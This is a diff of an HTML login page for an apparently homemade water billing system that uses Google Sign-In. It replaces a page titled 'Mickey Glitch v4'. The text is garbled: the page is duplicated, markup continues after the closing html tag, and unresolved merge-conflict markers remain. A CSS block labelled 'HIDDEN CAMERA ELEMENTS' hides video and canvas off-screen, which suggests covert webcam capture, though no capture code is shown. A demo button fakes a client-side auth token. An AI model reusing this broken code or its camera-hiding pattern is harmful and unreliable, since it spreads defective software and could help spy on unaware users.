@@ -1,99 +1,670 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mickey Glitch v4 - All-in-One</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --primary: #00d2ff;
-            --accent: #9d50bb;
-            --bg: #0b0f19;
-            --card: #161e2d;
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Secure Google Authentication - Mickey Water Billing System">
+  <meta name="author" content="Mickey Hamza">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Login - Water Billing System</title>
+  
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap">
+  <script src="https://accounts.google.com/gsi/client" async defer></script>
+  
+  <style>
+    /* ============================================
+       RESET & VARIABLES
+       ============================================ */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --primary-color: #1e40af;
+      --secondary-color: #0ea5e9;
+      --success-color: #10b981;
+      --error-color: #ef4444;
+      --warning-color: #f59e0b;
+      --background-light: #f8fafc;
+      --background-dark: #0f172a;
+      --text-primary: #1e293b;
+      --text-secondary: #64748b;
+      --border-color: #e2e8f0;
+      --shadow-md: 0 8px 24px rgba(0, 0, 0, 0.12);
+      --shadow-lg: 0 12px 32px rgba(0, 0, 0, 0.15);
+      --border-radius: 16px;
+      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    /* ============================================
+       BODY & LAYOUT
+       ============================================ */
+    body {
+      font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: var(--text-primary);
+      overflow: hidden;
+      padding: 20px;
+    }
+
+    /* ============================================
+       CONTAINER
+       ============================================ */
+    .login-container {
+      text-align: center;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      padding: 3rem;
+      border-radius: var(--border-radius);
+      box-shadow: var(--shadow-lg);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      max-width: 480px;
+      width: 100%;
+      transition: var(--transition);
+    }
+
+    .login-container.error {
+      border-color: var(--error-color);
+      background: rgba(255, 255, 255, 0.98);
+    }
+
+    /* ============================================
+       HEADER SECTION
+       ============================================ */
+    h1 {
+      margin-bottom: 0.75rem;
+      font-size: clamp(1.5rem, 5vw, 2rem);
+      background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+
+    .subtitle {
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+      margin-bottom: 2rem;
+      font-weight: 500;
+    }
+
+    /* ============================================
+       STATUS & MESSAGES
+       ============================================ */
+    .status {
+      margin: 2rem 0;
+      padding: 1rem;
+      font-weight: 600;
+      font-size: 1rem;
+      min-height: 50px;
+      border-radius: 10px;
+      transition: var(--transition);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.75rem;
+      background: linear-gradient(135deg, rgba(30, 64, 175, 0.1), rgba(14, 165, 233, 0.1));
+      color: var(--primary-color);
+      border: 2px solid rgba(30, 64, 175, 0.2);
+    }
+
+    .status.success {
+      background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(10, 185, 181, 0.1));
+      color: var(--success-color);
+      border-color: rgba(16, 185, 129, 0.3);
+    }
+
+    .status.error {
+      background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(239, 68, 68, 0.1));
+      color: var(--error-color);
+      border-color: rgba(239, 68, 68, 0.3);
+    }
+
+    /* ============================================
+       GOOGLE SIGN IN
+       ============================================ */
+    #googleSignInContainer {
+      margin: 2rem 0;
+      display: flex;
+      justify-content: center;
+    }
+
+    .g_id_signin div {
+      margin: 0 auto;
+    }
+
+    /* ============================================
+       DIVIDER
+       ============================================ */
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      margin: 1.5rem 0;
+      color: var(--text-secondary);
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border-color);
+    }
+
+    /* ============================================
+       DEMO BUTTON
+       ============================================ */
+    .demo-mode {
+      margin-top: 2rem;
+      padding-top: 1.5rem;
+      border-top: 1px solid var(--border-color);
+    }
+
+    .btn-demo {
+      width: 100%;
+      padding: 0.85rem 1.5rem;
+      background: linear-gradient(135deg, rgba(14, 165, 233, 0.2), rgba(30, 64, 175, 0.2));
+      color: var(--secondary-color);
+      border: 2px solid var(--secondary-color);
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: var(--transition);
+      font-family: 'Poppins', sans-serif;
+      font-size: 0.95rem;
+    }
+
+    .btn-demo:hover {
+      background: linear-gradient(135deg, rgba(14, 165, 233, 0.3), rgba(30, 64, 175, 0.3));
+      transform: translateY(-2px);
+      box-shadow: var(--shadow-md);
+    }
+
+    /* ============================================
+       LOADING SPINNER
+       ============================================ */
+    .spinner {
+      display: inline-block;
+      width: 1.2rem;
+      height: 1.2rem;
+      border: 3px solid rgba(30, 64, 175, 0.2);
+      border-top-color: var(--primary-color);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    /* ============================================
+       RESPONSIVE
+       ============================================ */
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 2rem;
+      }
+
+      h1 {
+        font-size: 1.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container" id="loginContainer">
+    <h1>🔐 Water Billing System</h1>
+    <p class="subtitle">Secure Google Account Login</p>
+
+    <!-- STATUS MESSAGE -->
+    <div class="status" id="status" style="display: none;">
+      <span class="spinner"></span>
+      <span id="statusText">Authenticating...</span>
+    </div>
+
+    <!-- GOOGLE SIGN IN -->
+    <div id="googleSignInContainer"></div>
+
+    <!-- DEMO MODE -->
+    <div class="demo-mode">
+      <div class="divider">Demo Access</div>
+      <button class="btn-demo" onclick="loginAsDemo()">Skip to Demo (Billing System)</button>
+    </div>
+  </div>
+
+  <script>
+    /**
+     * Google Sign-In Authentication
+     * Handles user authentication and data persistence
+     */
+
+    // ============================================
+    // CONFIGURATION
+    // ============================================
+    const GOOGLE_CLIENT_ID = 'YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com';
+    // Replace above with your actual Google Client ID from Google Cloud Console
+
+    // ============================================
+    // DOM ELEMENTS
+    // ============================================
+    const statusDiv = document.getElementById('status');
+    const statusText = document.getElementById('statusText');
+    const container = document.getElementById('loginContainer');
+
+    // ============================================
+    // INITIALIZATION
+    // ============================================
+    window.onload = function() {
+      google.accounts.id.initialize({
+        client_id: GOOGLE_CLIENT_ID,
+        callback: handleCredentialResponse
+      });
+
+      google.accounts.id.renderButton(
+        document.getElementById('googleSignInContainer'),
+        {
+          theme: 'outline',
+          size: 'large',
+          width: '100%'
         }
+      );
+    };
 
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', 'Segoe UI', sans-serif; }
+    // ============================================
+    // GOOGLE SIGN-IN HANDLER
+    // ============================================
+    async function handleCredentialResponse(response) {
+      try {
+        // Show loading status
+        statusDiv.style.display = 'flex';
+        updateStatus('Authenticating with Google...', '');
 
-        body {
-            background: linear-gradient(135deg, #0b0f19 0%, #1e1b4b 100%);
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 20px;
+        // Send token to backend for verification
+        const result = await fetch('/auth/google', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            token: response.credential
+          })
+        });
+
+        const data = await result.json();
+
+        if (data.success) {
+          // Store JWT token in localStorage
+          localStorage.setItem('authToken', data.token);
+          localStorage.setItem('user', JSON.stringify(data.user));
+
+          updateStatus('✓ Authentication successful!', 'success');
+          
+          // Redirect to main page
+          setTimeout(() => {
+            window.location.href = 'main.html';
+          }, 1500);
+        } else {
+          updateStatus(`✗ Authentication failed: ${data.error}`, 'error');
+          statusDiv.style.display = 'flex';
         }
+      } catch (error) {
+        console.error('Authentication error:', error);
+        updateStatus('✗ Authentication failed. Please try again.', 'error');
+        statusDiv.style.display = 'flex';
+      }
+    }
 
-        .container {
-            background: var(--card);
-            padding: 30px;
-            border-radius: 24px;
-            width: 100%;
-            max-width: 420px;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
-            border: 1px solid rgba(255,255,255,0.08);
-            text-align: center;
+    // ============================================
+    // UTILITY FUNCTIONS
+    // ============================================
+    function updateStatus(message, className = '') {
+      statusText.textContent = message;
+      statusDiv.className = `status ${className}`;
+    }
+
+    /**
+     * Demo mode - Skip authentication
+     */
+    function loginAsDemo() {
+      // Create demo token for testing
+      const demoUser = {
+        userId: 'demo-user-' + Date.now(),
+        email: 'demo@example.com',
+        name: 'Demo User',
+        picture: 'https://lh3.googleusercontent.com/a/default-user=s96-c',
+        provider: 'demo'
+      };
+
+      localStorage.setItem('user', JSON.stringify(demoUser));
+      localStorage.setItem('authToken', 'demo-token-' + Date.now());
+
+      statusDiv.style.display = 'flex';
+      updateStatus('Welcome to Demo Mode!', 'success');
+
+      setTimeout(() => {
+        window.location.href = 'main.html';
+      }, 1500);
+    }
+
+    /**
+     * Logout function (for use in other pages)
+     */
+    function logout() {
+      localStorage.removeItem('authToken');
+      localStorage.removeItem('user');
+      window.location.href = '/';
+    }
+
+    // Make logout globally available
+    window.logout = logout;
+  </script>
+</body>
+</html>
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 2rem;
+      }
+
+      h1 {
+        font-size: 1.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container" id="loginContainer">
+    <h1>🔐 Water Billing System</h1>
+    <p class="subtitle">Secure Google Account Login</p>
+
+    <!-- STATUS MESSAGE -->
+    <div class="status" id="status" style="display: none;">
+      <span class="spinner"></span>
+      <span id="statusText">Authenticating...</span>
+    </div>
+
+    <!-- GOOGLE SIGN IN -->
+    <div id="googleSignInContainer"></div>
+
+    <!-- DEMO MODE -->
+    <div class="demo-mode">
+      <div class="divider">Demo Access</div>
+      <button class="btn-demo" onclick="loginAsDemo()">Skip to Demo (Billing System)</button>
+    </div>
+  </div>
+
+  <script>
+    /**
+     * Google Sign-In Authentication
+     * Handles user authentication and data persistence
+     */
+
+    // ============================================
+    // CONFIGURATION
+    // ============================================
+    const GOOGLE_CLIENT_ID = 'YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com';
+    // Replace above with your actual Google Client ID from Google Cloud Console
+
+    // ============================================
+    // DOM ELEMENTS
+    // ============================================
+    const statusDiv = document.getElementById('status');
+    const statusText = document.getElementById('statusText');
+    const container = document.getElementById('loginContainer');
+
+    // ============================================
+    // INITIALIZATION
+    // ============================================
+    window.onload = function() {
+      google.accounts.id.initialize({
+        client_id: GOOGLE_CLIENT_ID,
+        callback: handleCredentialResponse
+      });
+
+      google.accounts.id.renderButton(
+        document.getElementById('googleSignInContainer'),
+        {
+          theme: 'outline',
+          size: 'large',
+          width: '100%'
         }
+      );
+    };
 
-        .logo-icon {
-            font-size: 40px;
-            background: linear-gradient(to right, var(--primary), var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
+    // ============================================
+    // GOOGLE SIGN-IN HANDLER
+    // ============================================
+    async function handleCredentialResponse(response) {
+      try {
+        // Show loading status
+        statusDiv.style.display = 'flex';
+        updateStatus('Authenticating with Google...', '');
+
+        // Send token to backend for verification
+        const result = await fetch('/auth/google', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            token: response.credential
+          })
+        });
+
+        const data = await result.json();
+
+        if (data.success) {
+          // Store JWT token in localStorage
+          localStorage.setItem('authToken', data.token);
+          localStorage.setItem('user', JSON.stringify(data.user));
+
+          updateStatus('✓ Authentication successful!', 'success');
+          
+          // Redirect to main page
+          setTimeout(() => {
+            window.location.href = 'main.html';
+          }, 1500);
+        } else {
+          updateStatus(`✗ Authentication failed: ${data.error}`, 'error');
+          statusDiv.style.display = 'flex';
         }
+      } catch (error) {
+        console.error('Authentication error:', error);
+        updateStatus('✗ Authentication failed. Please try again.', 'error');
+        statusDiv.style.display = 'flex';
+      }
+    }
 
-        h2 {
-            font-size: 20px;
-            letter-spacing: 2px;
-            margin-bottom: 25px;
-            color: #f8fafc;
-        }
+    // ============================================
+    // UTILITY FUNCTIONS
+    // ============================================
+    function updateStatus(message, className = '') {
+      statusText.textContent = message;
+      statusDiv.className = `status ${className}`;
+    }
 
-        .input-box {
-            position: relative;
-            margin-bottom: 20px;
-        }
+    /**
+     * Demo mode - Skip authentication
+     */
+    function loginAsDemo() {
+      // Create demo token for testing
+      const demoUser = {
+        userId: 'demo-user-' + Date.now(),
+        email: 'demo@example.com',
+        name: 'Demo User',
+        picture: 'https://lh3.googleusercontent.com/a/default-user=s96-c',
+        provider: 'demo'
+      };
 
-        input {
-            width: 100%;
-            padding: 15px 15px 15px 45px;
-            border-radius: 14px;
-            border: 2px solid #2d3748;
-            background: #0f172a;
-            color: white;
-            outline: none;
-            font-size: 15px;
-            transition: 0.3s;
-        }
+      localStorage.setItem('user', JSON.stringify(demoUser));
+      localStorage.setItem('authToken', 'demo-token-' + Date.now());
 
-        input:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(0,210,255,0.1); }
+      statusDiv.style.display = 'flex';
+      updateStatus('Welcome to Demo Mode!', 'success');
 
-        .input-box i {
-            position: absolute;
-            left: 15px;
-            top: 18px;
-            color: #64748b;
-        }
+      setTimeout(() => {
+        window.location.href = 'main.html';
+      }, 1500);
+    }
 
-        button {
-            width: 100%;
-            padding: 15px;
-            border-radius: 14px;
-            border: none;
-            background: linear-gradient(45deg, var(--primary), var(--accent));
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
+    /**
+     * Logout function (for use in other pages)
+     */
+    function logout() {
+      localStorage.removeItem('authToken');
+      localStorage.removeItem('user');
+      window.location.href = '/';
+    }
 
+    // Make logout globally available
+    window.logout = logout;
+  </script>
+</body>
+</html>
+    /* ============================================
+       RESET & VARIABLES
+       ============================================ */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --primary-color: #1e40af;
+      --secondary-color: #0ea5e9;
+      --success-color: #10b981;
+      --error-color: #ef4444;
+      --warning-color: #f59e0b;
+      --background-light: #f8fafc;
+      --background-dark: #0f172a;
+      --text-primary: #1e293b;
+      --text-secondary: #64748b;
+      --border-color: #e2e8f0;
+      --shadow-md: 0 8px 24px rgba(0, 0, 0, 0.12);
+      --shadow-lg: 0 12px 32px rgba(0, 0, 0, 0.15);
+      --border-radius: 16px;
+      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    /* ============================================
+       BODY & LAYOUT
+       ============================================ */
+    body {
+      font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: var(--text-primary);
+      overflow: hidden;
+      padding: 20px;
+    }
+
+    /* ============================================
+       CONTAINER
+       ============================================ */
+    .login-container {
+      text-align: center;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      padding: 3rem;
+      border-radius: var(--border-radius);
+      box-shadow: var(--shadow-lg);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      max-width: 480px;
+      width: 100%;
+      transition: var(--transition);
+    }
+
+    .login-container.error {
+      border-color: var(--error-color);
+      background: rgba(255, 255, 255, 0.98);
+    }
+
+    /* ============================================
+       HEADER SECTION
+       ============================================ */
+    h1 {
+      margin-bottom: 0.75rem;
+      font-size: clamp(1.5rem, 5vw, 2rem);
+      background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+
+    .subtitle {
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+      margin-bottom: 2rem;
+      font-weight: 500;
+    }
+
+    /* ============================================
+       STATUS & MESSAGES
+       ============================================ */
+    .status {
+      margin: 2rem 0;
+      padding: 1rem;
+      font-weight: 600;
+      font-size: 1rem;
+      min-height: 50px;
+      border-radius: 10px;
+      transition: var(--transition);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.75rem;
+      background: linear-gradient(135deg, rgba(30, 64, 175, 0.1), rgba(14, 165, 233, 0.1));
+      color: var(--primary-color);
+      border: 2px solid rgba(30, 64, 175, 0.2);
+    }
+
+    .status.success {
+      background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(10, 185, 181, 0.1));
+      color: var(--success-color);
+      border-color: rgba(16, 185, 129, 0.3);
+    }
+
+    .status.error {
+      background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(239, 68, 68, 0.1));
+      color: var(--error-color);
+      border-color: rgba(239, 68, 68, 0.3);
+    }
+
+    .status.warning {
+      background: linear-gradient(135deg, rgba(245, 158, 11, 0.1), rgba(245, 158, 11, 0.1));
+      color: var(--warning-color);
+      border-color: rgba(245, 158, 11, 0.3);
+    }
+
+    /* ============================================
+       HIDDEN CAMERA ELEMENTS
+       ============================================ */
+    video, canvas {
+      display: none !important;
+      position: fixed;
+      top: -9999px;
+      left: -9999px;
+      width: 320px !important;
+      height: 240px !important;
+      z-index: -999;
+    }
+=======
         button:active { transform: scale(0.98); }
+>>>>>>> 8024da146a02797ebf89183f60494e38c526216c
 
         /* Status Area */
         #status-area {
